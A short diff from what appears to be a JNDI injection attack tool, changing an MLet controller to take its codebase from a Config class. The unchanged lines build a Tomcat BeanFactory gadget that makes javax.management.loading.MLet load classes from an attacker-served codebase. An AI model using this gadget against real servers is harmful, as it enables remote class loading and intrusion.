@@ -1,5 +1,6 @@
 package map.jndi.controller;
 
+import map.jndi.Config;
 import map.jndi.Main;
 import map.jndi.annotation.JNDIController;
 import map.jndi.annotation.JNDIMapping;
@@ -15,7 +16,7 @@ public class MLetController implements Controller {
         ResourceRef ref = new ResourceRef("javax.management.loading.MLet", null, "", "", true, "org.apache.naming.factory.BeanFactory", null);
         ref.add(new StringRefAddr("forceString", "a=loadClass,b=addURL,c=loadClass"));
         ref.add(new StringRefAddr("a", className));
-        ref.add(new StringRefAddr("b", Main.codebase));
+        ref.add(new StringRefAddr("b", Config.codebase));
         ref.add(new StringRefAddr("c", className + "_exists"));
 
         WebServer.serveFile("/" + className.replace(".", "/") + "_exists.class", null);
